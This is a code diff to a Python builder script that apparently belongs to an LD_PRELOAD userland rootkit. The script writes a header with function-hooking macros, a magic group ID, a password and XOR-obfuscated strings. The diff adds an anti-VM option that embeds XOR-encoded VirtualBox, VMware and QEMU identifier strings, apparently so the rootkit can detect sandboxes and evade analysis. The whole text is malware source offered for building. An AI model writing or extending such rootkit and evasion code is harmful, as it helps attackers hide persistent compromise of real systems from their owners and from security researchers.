@@ -36,6 +36,7 @@ def main():
     execpw = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "password: ")
     ptrace = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "ptrace msg: ")
     debug = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "debug? [y/n]: ")
+    antivm = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "anti-vm? [y/n]: ")
     try:
         f = open("rkconst.h", "w")
         f.write("#ifndef RTLD_NEXT\n#define RTLD_NEXT ((void *) -11)\n#endif\n#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)\n#define CLEAN(var) clean(var, strlen(var))\n")
@@ -48,7 +49,13 @@ def main():
         f.write("#define PTRACE_MSG " + "\"" + xor(ptrace, key) + "\"" + "\n")
         f.write("#define MAGICGID "  + magicgid + "\n")
         if debug.lower() == "y": 
-            f.write("#define DEBUG\n") 
+            f.write("#define DEBUG\n")
+        if antivm.lower() == "y": 
+            f.write("#define ANTIVM\n")
+        f.write("//----------ANTI-VM STUFF----------\n")
+        f.write("#define VBOX_STR " + "\"" + xor("VBoxVBoxVBox", key) + "\"" + "\n")
+        f.write("#define VMWARE_STR " + "\"" + xor("VMwareVMware", key) + "\"" + "\n")
+        f.write("#define QEMU_STR " + "\"" + xor("TCGTCGTCGTCG", key) + "\"" + "\n") 
         f.close()
         here = os.path.dirname(os.path.realpath(__file__))
         subdir = "utils"
